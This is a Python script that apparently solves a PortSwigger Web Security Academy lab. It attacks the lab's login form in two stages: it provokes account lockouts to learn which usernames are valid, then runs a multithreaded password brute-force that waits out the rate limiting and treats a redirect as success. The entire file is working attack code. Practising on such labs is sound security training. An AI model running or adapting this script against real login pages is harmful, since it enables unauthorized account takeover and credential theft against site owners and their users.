import time
from queue import Queue
import requests
import threading

server_name = "0ae4008e03c7632580ef530d00f800e5"

url = f"https://{server_name}.web-security-academy.net/login"
headers = {
    "Host": f"{server_name}.web-security-academy.net",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": url,
    "Referer": url,
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers",
    "Connection": "keep-alive"
}

found = threading.Event()
username_queue = Queue()
password_list = []


def bruteForce():
    global response
    tries = 0
    username = ""

    while not username_queue.empty() and not found.is_set():
        username = username_queue.get()
        data = f"username={username}&password=123"

        print(f"[-] Trying: {username}")
        # Trying to lock an account.
        for _ in range(4):
            session = requests.session()
            response = session.post(url, headers=headers, data=data, allow_redirects=False)

        # Checking if the account is temporarily locked.
        if b"Invalid username or password." not in response.content:
            found.set()
            time.sleep(2)
            print(f"\n[*] Username found: {username}\n")

            for password in password_list:
                print(f"[-] Trying: {username} : {password}")
                data = f"username={username}&password={password}"

                while True:
                    response = requests.post(url, headers=headers, data=data, allow_redirects=False)
                    if b"You have made too many incorrect login attempts." in response.content:
                        time.sleep(10)
                    elif response.status_code == 302:
                        print(f"\n[*] Credentials found: {username} : {password}")
                        exit(0)
                    else:
                        break





def main():
    number_of_threads = 10
    threads = []

    # Put the usernames in a Queue
    with open('../credentials/usernames', 'r') as file:
        for line in file:
            username_queue.put(line.strip('\n'))

    # Put the passwords in a Queue
    with open('../credentials/passwords', 'r') as file:
        for line in file:
            password_list.append(line.strip('\n'))

    # Create threads
    for _ in range(number_of_threads):
        t = threading.Thread(target=bruteForce)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    bruteForce()

if __name__ == '__main__':
    main()